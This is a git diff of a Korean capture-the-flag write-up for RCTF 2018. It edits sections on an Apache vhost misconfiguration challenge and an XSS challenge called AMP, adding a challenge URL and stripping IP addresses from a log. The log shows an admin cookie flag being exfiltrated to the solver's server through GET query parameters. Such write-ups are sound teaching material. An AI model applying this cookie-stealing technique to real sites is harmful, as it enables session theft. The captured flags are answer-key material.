@@ -78,15 +78,13 @@ $ curl "http://c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295.sandbox.r-cursive.ml:133
 ?>
 ```
 
-
-
 FLAG : RCTF{apache_mod_vhost_alias_should_be_configured_correctly}
-
-
 
 ### - AMP
 
-> No Description
+> Building the future web, together.
+>
+> http://amp.2018.teamrois.cn
 
 페이지에 접속하면 steins;gate 0를 배경으로 한 페이지가 나타난다.
 
@@ -187,12 +185,10 @@ YOU'RE BEING TRACKING
 위의 코드를 name으로 넣어주었으며, FLAG를 얻을 수 있었다.
 
 ```
-58.76.163.238 - - [22/May/2018 15:30:23] "GET /?cid=flag_is_in_admin_cookie HTTP/1.1" 200 -
-58.76.163.238 - - [22/May/2018 15:30:23] "GET /?cid= HTTP/1.1" 200 -
-58.76.163.238 - - [22/May/2018 15:30:24] "GET /?cid=RCTF%7BEl_PsY_CONGRO0_sg0%7D HTTP/1.1" 200 -
-58.76.163.238 - - [22/May/2018 15:30:24] "GET /?cid= HTTP/1.1" 200 -
+"GET /?cid=flag_is_in_admin_cookie HTTP/1.1" 200 -
+"GET /?cid= HTTP/1.1" 200 -
+"GET /?cid=RCTF%7BEl_PsY_CONGRO0_sg0%7D HTTP/1.1" 200 -
+"GET /?cid= HTTP/1.1" 200 - 
 ```
-
- 
 
 FLAG : RCTF{El_PsY_CONGRO0_sg0}
